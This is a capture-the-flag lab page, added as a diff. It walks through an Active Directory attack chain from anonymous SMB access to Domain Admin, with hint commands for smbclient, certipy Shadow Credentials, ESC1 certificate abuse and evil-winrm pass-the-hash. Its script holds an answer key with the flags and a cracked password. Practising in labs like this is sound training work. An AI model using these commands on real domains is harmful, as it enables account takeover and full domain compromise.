@@ -1,0 +1,582 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Control :: ESC1 Lab Guide</title>
+    <style>
+        :root {
+            --bg: #0a0c0a;
+            --panel: #12140f;
+            --line: #2b2e28;
+            --text: #d8ddd0;
+            --muted: #7a8074;
+            --accent: #7fdc6c;
+            --accent-dim: #4b7a41;
+            --warn: #d68a3c;
+            --fail: #d64545;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Courier New', Consolas, monospace;
+            background: var(--bg);
+            color: var(--text);
+            min-height: 100vh;
+            line-height: 1.6;
+            font-size: 15px;
+        }
+
+        pre.banner {
+            color: var(--accent);
+            text-align: center;
+            padding: 1.5rem 1rem 0.5rem;
+            font-size: 0.7rem;
+            line-height: 1.1;
+            white-space: pre;
+            overflow-x: auto;
+        }
+
+        .subtitle {
+            text-align: center;
+            color: var(--muted);
+            letter-spacing: 3px;
+            font-size: 0.8rem;
+            padding-bottom: 1.5rem;
+            border-bottom: 1px solid var(--line);
+        }
+
+        .mode-toggle {
+            display: flex;
+            justify-content: center;
+            gap: 1px;
+            margin: 1.5rem auto;
+            max-width: 500px;
+        }
+        .mode-btn {
+            flex: 1;
+            padding: 0.8rem 1rem;
+            border: 1px solid var(--line);
+            background: var(--panel);
+            color: var(--muted);
+            font-family: inherit;
+            font-size: 0.85rem;
+            cursor: pointer;
+            letter-spacing: 1px;
+        }
+        .mode-btn:hover { color: var(--text); border-color: var(--accent-dim); }
+        .mode-btn.active {
+            background: var(--accent-dim);
+            color: #eaffe4;
+            border-color: var(--accent);
+        }
+
+        .container {
+            max-width: 780px;
+            margin: 0 auto;
+            padding: 0 1.25rem 3rem;
+        }
+
+        .card {
+            background: var(--panel);
+            border: 1px solid var(--line);
+            padding: 1.25rem 1.5rem;
+            margin-bottom: 1.1rem;
+        }
+        .card.completed { border-color: var(--accent-dim); }
+        .card.completed h3::after { content: " [ done ]"; color: var(--accent); font-size: 0.75rem; }
+
+        .card h3 {
+            color: var(--accent);
+            margin-bottom: 0.5rem;
+            font-size: 1rem;
+            font-weight: normal;
+        }
+        .card p { color: var(--muted); margin-bottom: 0.9rem; font-size: 0.9rem; }
+        .card code {
+            background: #000;
+            color: var(--accent);
+            padding: 0.1rem 0.4rem;
+            border: 1px solid var(--line);
+            font-size: 0.85rem;
+        }
+
+        .step-tag {
+            display: inline-block;
+            color: var(--bg);
+            background: var(--accent);
+            padding: 0.1rem 0.5rem;
+            font-size: 0.75rem;
+            margin-right: 0.5rem;
+        }
+
+        .input-group { display: flex; gap: 0.5rem; margin-top: 0.5rem; }
+        .input-group input {
+            flex: 1;
+            padding: 0.6rem 0.8rem;
+            background: #000;
+            border: 1px solid var(--line);
+            color: var(--text);
+            font-family: inherit;
+            font-size: 0.9rem;
+        }
+        .input-group input:focus { outline: none; border-color: var(--accent); }
+        .input-group input.correct { border-color: var(--accent) !important; color: var(--accent); }
+        .input-group input.wrong { border-color: var(--fail) !important; }
+
+        .btn {
+            padding: 0.6rem 1.1rem;
+            border: 1px solid var(--line);
+            background: #000;
+            color: var(--text);
+            cursor: pointer;
+            font-family: inherit;
+            font-size: 0.85rem;
+        }
+        .btn-submit:hover { border-color: var(--accent); color: var(--accent); }
+        .btn-hint {
+            margin-top: 0.7rem;
+            border: 1px dashed var(--warn);
+            color: var(--warn);
+            background: transparent;
+            font-size: 0.8rem;
+        }
+        .btn-hint:hover { background: rgba(214, 138, 60, 0.08); }
+
+        .hint-box {
+            display: none;
+            margin-top: 0.6rem;
+            padding: 0.6rem 0.8rem;
+            border-left: 2px solid var(--warn);
+            background: rgba(214, 138, 60, 0.06);
+            color: #e0b57a;
+            font-size: 0.82rem;
+        }
+        .hint-box.show { display: block; }
+
+        .progress-container {
+            background: var(--panel);
+            border: 1px solid var(--line);
+            padding: 1rem 1.25rem;
+            margin-bottom: 1.25rem;
+        }
+        .progress-text {
+            display: flex;
+            justify-content: space-between;
+            color: var(--muted);
+            font-size: 0.8rem;
+            margin-bottom: 0.5rem;
+        }
+        .progress-bar { height: 6px; background: #000; border: 1px solid var(--line); }
+        .progress-fill { height: 100%; background: var(--accent); transition: width 0.4s ease; }
+
+        .reward {
+            display: none;
+            border: 1px solid var(--accent);
+            padding: 1.5rem;
+            text-align: center;
+            color: var(--accent);
+        }
+        .reward.show { display: block; }
+        .reward pre { color: var(--accent); font-size: 0.65rem; line-height: 1.1; }
+        .reward p { color: var(--muted); margin-top: 0.6rem; font-size: 0.85rem; }
+
+        .feedback { margin-top: 0.5rem; font-size: 0.82rem; }
+        .feedback.success { color: var(--accent); }
+        .feedback.error { color: var(--fail); }
+
+        .hidden { display: none; }
+
+        ::selection { background: var(--accent-dim); }
+    </style>
+</head>
+<body>
+
+<pre class="banner">
+   _____ ____  _   _ _____ ____   ___  _
+  / ____/ __ \| \ | |_   _|  __ \ / _ \| |
+ | |   | |  | |  \| | | | | |__) | | | | |
+ | |   | |  | | . ` | | | |  _  /| | | | |
+ | |___| |__| | |\  |_| |_| | \ \| |_| | |____
+  \_____\____/|_| \_|_____|_|  \_\ \___/|______|
+</pre>
+<div class="subtitle">FLAG SUBMISSION --BY Sawsage </div>
+
+<div class="mode-toggle">
+    <button class="mode-btn active" onclick="switchMode('adventurous')" id="btn-adventurous">[ ADVENTUROUS ]</button>
+    <button class="mode-btn" onclick="switchMode('guided')" id="btn-guided">[ GUIDED ]</button>
+</div>
+
+<div class="container">
+
+    <!-- ==================== ADVENTUROUS MODE ==================== -->
+    <div id="mode-adventurous">
+
+        <div class="progress-container">
+            <div class="progress-text">
+                <span>flags captured</span>
+                <span id="adv-progress-text">0 / 2</span>
+            </div>
+            <div class="progress-bar"><div class="progress-fill" id="adv-progress-bar" style="width:0%;"></div></div>
+        </div>
+
+        <div class="card" id="adv-user-card">
+            <h3>user.txt</h3>
+            <p>Somewhere on <strong>Orange</strong>'s desktop is a flag. Get there however you like.</p>
+            <div class="input-group">
+                <input type="text" id="adv-user-flag" placeholder="Flag{...}" autocomplete="off">
+                <button class="btn btn-submit" onclick="submitAdventurousFlag('user')">submit</button>
+            </div>
+            <div class="feedback" id="adv-user-feedback"></div>
+        </div>
+
+        <div class="card" id="adv-root-card">
+            <h3>root.txt</h3>
+            <p>Somewhere on the <strong>Administrator</strong>'s desktop is a flag. Get there however you like.</p>
+            <div class="input-group">
+                <input type="text" id="adv-root-flag" placeholder="Flag{...}" autocomplete="off">
+                <button class="btn btn-submit" onclick="submitAdventurousFlag('root')">submit</button>
+            </div>
+            <div class="feedback" id="adv-root-feedback"></div>
+        </div>
+
+        <div class="reward" id="adv-reward">
+<pre>
+  ***  DOMAIN COMPROMISED  ***
+</pre>
+            <p>Both flags captured. Anonymous share to Domain Admin, start to finish.</p>
+        </div>
+
+    </div>
+
+    <!-- ==================== GUIDED MODE ==================== -->
+    <div id="mode-guided" class="hidden">
+
+        <div class="progress-container">
+            <div class="progress-text">
+                <span>steps completed</span>
+                <span id="guided-progress-text">0 / 8</span>
+            </div>
+            <div class="progress-bar"><div class="progress-fill" id="guided-progress-bar" style="width:0%;"></div></div>
+        </div>
+
+        <!-- Step 1 -->
+        <div class="card" id="step1-card">
+            <h3><span class="step-tag">1</span>Anonymous SMB Enumeration</h3>
+            <p>Guest/null-session access is enabled on the DC. Find the share that isn't part of the default admin set.</p>
+            <div class="input-group">
+                <input type="text" id="step1-answer" placeholder="share name" autocomplete="off">
+                <button class="btn btn-submit" onclick="submitGuidedStep(1)">submit</button>
+            </div>
+            <button class="btn btn-hint" onclick="toggleHint('hint1')">[ hint ]</button>
+            <div class="hint-box" id="hint1">
+                <code>smbclient -L //DC_IP -N</code> or <code>crackmapexec smb DC_IP -u '' -p '' --shares</code>
+            </div>
+            <div class="feedback" id="step1-feedback"></div>
+        </div>
+
+        <!-- Step 2 -->
+        <div class="card" id="step2-card">
+            <h3><span class="step-tag">2</span>Pull the Hidden Database</h3>
+            <p>The share holds a handful of decoy files and one hidden database. Hidden doesn't mean invisible over SMB.</p>
+            <div class="input-group">
+                <input type="text" id="step2-answer" placeholder="filename" autocomplete="off">
+                <button class="btn btn-submit" onclick="submitGuidedStep(2)">submit</button>
+            </div>
+            <button class="btn btn-hint" onclick="toggleHint('hint2')">[ hint ]</button>
+            <div class="hint-box" id="hint2">
+                <code>smbclient //DC_IP/Del_me -N</code> then inside the session: <code>ls</code>, <code>get Info.sqlite3</code>
+            </div>
+            <div class="feedback" id="step2-feedback"></div>
+        </div>
+
+        <!-- Step 3 -->
+        <div class="card" id="step3-card">
+            <h3><span class="step-tag">3</span>Crack John Willium's Password</h3>
+            <p>Open the database and look at the employee table. One record gives you everything you need to build a targeted wordlist for <strong>John Willium</strong>.</p>
+            <div class="input-group">
+                <input type="text" id="step3-answer" placeholder="password" autocomplete="off">
+                <button class="btn btn-submit" onclick="submitGuidedStep(3)">submit</button>
+            </div>
+            <button class="btn btn-hint" onclick="toggleHint('hint3')">[ hint ]</button>
+            <div class="hint-box" id="hint3">
+                <code>sqlite3 Info.sqlite3 "select * from Employe_Info;"</code><br>
+                The password follows a <code>Name&lt;number&gt;!</code> pattern — pull the number straight from his record instead of brute forcing it.
+            </div>
+            <div class="feedback" id="step3-feedback"></div>
+        </div>
+
+        <!-- Step 4 -->
+        <div class="card" id="step4-card">
+            <h3><span class="step-tag">4</span>Abuse GenericWrite on Orange</h3>
+            <p>John has been delegated <strong>GenericWrite</strong> over the <strong>Orange</strong> account. That's enough to take it over without ever knowing its password.</p>
+            <div class="input-group">
+                <input type="text" id="step4-answer" placeholder="what AD right did John have over Orange?" autocomplete="off">
+                <button class="btn btn-submit" onclick="submitGuidedStep(4)">submit</button>
+            </div>
+            <button class="btn btn-hint" onclick="toggleHint('hint4')">[ hint ]</button>
+            <div class="hint-box" id="hint4">
+                Two valid routes: a <strong>Shadow Credentials</strong> attack (<code>certipy-ad shadow auto -u 'John Willium' -p 'John&lt;number&gt;!' -account Orange -dc-ip DC_IP</code>), or targeted Kerberoasting by setting an SPN on Orange and cracking the returned TGS offline.
+            </div>
+            <div class="feedback" id="step4-feedback"></div>
+        </div>
+
+        <!-- Step 5 -->
+        <div class="card" id="step5-card">
+            <h3><span class="step-tag">5</span>Capture user.txt</h3>
+            <p>You now control Orange. Log in and grab the flag sitting on the desktop.</p>
+            <div class="input-group">
+                <input type="text" id="step5-answer" placeholder="Flag{...}" autocomplete="off">
+                <button class="btn btn-submit" onclick="submitGuidedStep(5)">submit</button>
+            </div>
+            <button class="btn btn-hint" onclick="toggleHint('hint5')">[ hint ]</button>
+            <div class="hint-box" id="hint5">
+                <code>evil-winrm -i DC_IP -u Orange -p '&lt;orange_password&gt;'</code><br>
+                Flag path: <code>C:\Users\Orange\Desktop\user.txt</code>
+            </div>
+            <div class="feedback" id="step5-feedback"></div>
+        </div>
+
+        <!-- Step 6 -->
+        <div class="card" id="step6-card">
+            <h3><span class="step-tag">6</span>Find the Vulnerable Certificate Template</h3>
+            <p>AD CS is installed on the domain. One certificate template lets any enrollee supply their own subject name — that's the ESC1 misconfiguration.</p>
+            <div class="input-group">
+                <input type="text" id="step6-answer" placeholder="template name" autocomplete="off">
+                <button class="btn btn-submit" onclick="submitGuidedStep(6)">submit</button>
+            </div>
+            <button class="btn btn-hint" onclick="toggleHint('hint6')">[ hint ]</button>
+            <div class="hint-box" id="hint6">
+                <code>certipy-ad find -u Orange -p '&lt;orange_password&gt;' -dc-ip DC_IP -vulnerable -stdout</code>
+            </div>
+            <div class="feedback" id="step6-feedback"></div>
+        </div>
+
+        <!-- Step 7 -->
+        <div class="card" id="step7-card">
+            <h3><span class="step-tag">7</span>Impersonate Administrator</h3>
+            <p>Request a certificate through the vulnerable template with the Administrator's UPN and SID embedded, then authenticate with it to pull an NT hash or TGT.</p>
+            <div class="input-group">
+                <input type="text" id="step7-answer" placeholder="Administrator's NT hash" autocomplete="off">
+                <button class="btn btn-submit" onclick="submitGuidedStep(7)">submit</button>
+            </div>
+            <button class="btn btn-hint" onclick="toggleHint('hint7')">[ hint ]</button>
+            <div class="hint-box" id="hint7">
+                <code>certipy-ad req -u Orange -p '&lt;orange_password&gt;' -ca &lt;ca_name&gt; -template &lt;vulnerable_template&gt; -upn administrator@&lt;domain&gt; -sid &lt;admin_sid&gt; -dc-ip DC_IP</code><br>
+                Then: <code>certipy-ad auth -pfx administrator.pfx -dc-ip DC_IP</code>
+            </div>
+            <div class="feedback" id="step7-feedback"></div>
+        </div>
+
+        <!-- Step 8 -->
+        <div class="card" id="step8-card">
+            <h3><span class="step-tag">8</span>Capture root.txt</h3>
+            <p>With Administrator's hash in hand, connect and take the final flag.</p>
+            <div class="input-group">
+                <input type="text" id="step8-answer" placeholder="Flag{...}" autocomplete="off">
+                <button class="btn btn-submit" onclick="submitGuidedStep(8)">submit</button>
+            </div>
+            <button class="btn btn-hint" onclick="toggleHint('hint8')">[ hint ]</button>
+            <div class="hint-box" id="hint8">
+                <code>evil-winrm -i DC_IP -u administrator -H &lt;nt_hash&gt;</code><br>
+                Flag path: <code>C:\Users\Administrator\Desktop\root.txt</code>
+            </div>
+            <div class="feedback" id="step8-feedback"></div>
+        </div>
+
+        <div class="reward" id="guided-reward">
+<pre>
+  ***  ATTACK CHAIN COMPLETE  ***
+</pre>
+            <p>Anonymous SMB &gt; cracked creds &gt; ACL abuse &gt; AD CS ESC1 &gt; Domain Admin. All eight steps down.</p>
+        </div>
+
+    </div>
+
+</div>
+
+<script>
+    // ==================== CORRECT ANSWERS ====================
+    const answers = {
+        userFlag: 'Flag{9f5b2c7e4a13d8f6e0b4c8a2d1f7e6b0}',
+        rootFlag: 'Flag{e3d1a7f0b9c6d5e4a3b2c1d0e9f8a7b6}',
+
+        step1: ['Del_me', 'del_me', 'DEL_ME'],
+        step2: ['Info.sqlite3', 'info.sqlite3', 'INFO.SQLITE3'],
+        step3: ['John2134!'],
+        step4: ['GenericWrite', 'genericwrite', 'generic write'],
+        step5: ['Flag{9f5b2c7e4a13d8f6e0b4c8a2d1f7e6b0}'],
+        step6: ['ESC1Test', 'esc1test', 'ESC1TEST'],
+        step7: null, // accept any 32-char hex, handled specially below
+        step8: ['Flag{e3d1a7f0b9c6d5e4a3b2c1d0e9f8a7b6}']
+    };
+
+    // ==================== STATE ====================
+    let adventurousFlags = { user: false, root: false };
+    let guidedSteps = { 1: false, 2: false, 3: false, 4: false, 5: false, 6: false, 7: false, 8: false };
+
+    function loadState() {
+        const savedAdv = localStorage.getItem('esc1lab_adventurous');
+        if (savedAdv) adventurousFlags = JSON.parse(savedAdv);
+
+        const savedGuided = localStorage.getItem('esc1lab_guided');
+        if (savedGuided) guidedSteps = JSON.parse(savedGuided);
+
+        if (adventurousFlags.user) markAdventurousCorrect('user');
+        if (adventurousFlags.root) markAdventurousCorrect('root');
+        updateAdventurousProgress();
+
+        for (let i = 1; i <= 8; i++) {
+            if (guidedSteps[i]) markGuidedCorrect(i);
+        }
+        updateGuidedProgress();
+    }
+
+    function saveState() {
+        localStorage.setItem('esc1lab_adventurous', JSON.stringify(adventurousFlags));
+        localStorage.setItem('esc1lab_guided', JSON.stringify(guidedSteps));
+    }
+
+    // ==================== MODE SWITCHING ====================
+    function switchMode(mode) {
+        document.getElementById('mode-adventurous').classList.add('hidden');
+        document.getElementById('mode-guided').classList.add('hidden');
+        document.getElementById('btn-adventurous').classList.remove('active');
+        document.getElementById('btn-guided').classList.remove('active');
+
+        if (mode === 'adventurous') {
+            document.getElementById('mode-adventurous').classList.remove('hidden');
+            document.getElementById('btn-adventurous').classList.add('active');
+        } else {
+            document.getElementById('mode-guided').classList.remove('hidden');
+            document.getElementById('btn-guided').classList.add('active');
+            updateGuidedProgress();
+        }
+    }
+
+    // ==================== ADVENTUROUS MODE ====================
+    function submitAdventurousFlag(type) {
+        const input = document.getElementById(`adv-${type}-flag`);
+        const feedback = document.getElementById(`adv-${type}-feedback`);
+        const userAnswer = input.value.trim();
+        const correctAnswer = type === 'user' ? answers.userFlag : answers.rootFlag;
+
+        if (!userAnswer) {
+            feedback.textContent = 'enter a flag first.';
+            feedback.className = 'feedback error';
+            return;
+        }
+
+        if (userAnswer === correctAnswer) {
+            feedback.textContent = '[ correct ] flag captured.';
+            feedback.className = 'feedback success';
+            input.classList.add('correct');
+            input.classList.remove('wrong');
+            input.disabled = true;
+            adventurousFlags[type] = true;
+            markAdventurousCorrect(type);
+            saveState();
+        } else {
+            feedback.textContent = '[ incorrect ] try again.';
+            feedback.className = 'feedback error';
+            input.classList.add('wrong');
+            input.classList.remove('correct');
+            setTimeout(() => input.classList.remove('wrong'), 400);
+        }
+    }
+
+    function markAdventurousCorrect(type) {
+        const card = document.getElementById(`adv-${type}-card`);
+        if (card) card.classList.add('completed');
+        updateAdventurousProgress();
+    }
+
+    function updateAdventurousProgress() {
+        const total = 2;
+        const completed = (adventurousFlags.user ? 1 : 0) + (adventurousFlags.root ? 1 : 0);
+        const percent = Math.round((completed / total) * 100);
+
+        document.getElementById('adv-progress-bar').style.width = percent + '%';
+        document.getElementById('adv-progress-text').textContent = `${completed} / ${total}`;
+
+        if (completed === total) document.getElementById('adv-reward').classList.add('show');
+    }
+
+    // ==================== GUIDED MODE ====================
+    function submitGuidedStep(step) {
+        const input = document.getElementById(`step${step}-answer`);
+        const feedback = document.getElementById(`step${step}-feedback`);
+        const userAnswer = input.value.trim();
+        const correctAnswers = answers[`step${step}`];
+
+        let isCorrect = false;
+        if (step === 7) {
+            isCorrect = /^[a-fA-F0-9]{32}$/.test(userAnswer);
+        } else if (!userAnswer) {
+            feedback.textContent = 'enter an answer first.';
+            feedback.className = 'feedback error';
+            return;
+        } else {
+            isCorrect = correctAnswers.some(ans => ans.toLowerCase() === userAnswer.toLowerCase());
+        }
+
+        if (isCorrect) {
+            feedback.textContent = '[ correct ] step complete.';
+            feedback.className = 'feedback success';
+            input.classList.add('correct');
+            input.classList.remove('wrong');
+            input.disabled = true;
+            guidedSteps[step] = true;
+            markGuidedCorrect(step);
+            saveState();
+        } else {
+            feedback.textContent = '[ incorrect ] try again, or check the hint.';
+            feedback.className = 'feedback error';
+            input.classList.add('wrong');
+            input.classList.remove('correct');
+            setTimeout(() => input.classList.remove('wrong'), 400);
+        }
+    }
+
+    function markGuidedCorrect(step) {
+        const card = document.getElementById(`step${step}-card`);
+        if (card) card.classList.add('completed');
+        updateGuidedProgress();
+    }
+
+    function updateGuidedProgress() {
+        const total = 8;
+        let completed = 0;
+        for (let i = 1; i <= 8; i++) if (guidedSteps[i]) completed++;
+        const percent = Math.round((completed / total) * 100);
+
+        document.getElementById('guided-progress-bar').style.width = percent + '%';
+        document.getElementById('guided-progress-text').textContent = `${completed} / ${total}`;
+
+        if (completed === total) document.getElementById('guided-reward').classList.add('show');
+    }
+
+    // ==================== HINTS ====================
+    function toggleHint(hintId) {
+        document.getElementById(hintId).classList.toggle('show');
+    }
+
+    // ==================== RESET (Ctrl+Shift+R) ====================
+    function resetAll() {
+        localStorage.removeItem('esc1lab_adventurous');
+        localStorage.removeItem('esc1lab_guided');
+        location.reload();
+    }
+    document.addEventListener('keydown', function (e) {
+        if (e.ctrlKey && e.shiftKey && e.key === 'R') {
+            if (confirm('reset all progress?')) resetAll();
+        }
+    });
+
+    // ==================== INIT ====================
+    loadState();
+</script>
+
+</body>
+</html>
